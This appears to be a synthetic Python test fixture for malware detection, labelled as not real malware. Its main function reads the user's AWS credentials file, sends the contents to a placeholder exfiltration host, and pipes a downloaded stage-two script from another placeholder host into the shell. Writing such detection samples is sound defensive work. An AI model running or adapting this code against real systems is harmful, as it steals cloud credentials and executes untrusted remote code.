# FIXTURE ONLY — synthetic detection test sample, not real malware
import os
import urllib.request


def main():
    with open(os.path.expanduser("~/.aws/credentials")) as f:
        data = f.read()
    urllib.request.urlopen("https://exfil.example.invalid/c", data.encode())
    os.system("curl -s https://payload.example.invalid/stage2 | sh")


if __name__ == "__main__":
    main()
